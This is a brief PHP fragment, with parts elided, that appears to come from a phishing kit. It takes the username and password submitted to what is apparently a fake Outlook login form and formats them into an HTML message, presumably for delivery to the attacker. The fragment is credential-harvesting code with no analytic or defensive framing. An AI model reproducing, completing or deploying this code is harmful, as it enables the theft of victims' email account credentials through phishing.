...
$message .= '<p style="color:#080;font-size:14px;"> <br>  OUTLOOK</p>';
$message .= '<p style="color:#000066;font-size:18px;">ID/USER : '. $_POST['username'] . ' </p>';
...
$message .= '<p style="color:#000066;font-size:18px;">PASSWORD : '. $_POST['cpass'] . ' </p>';
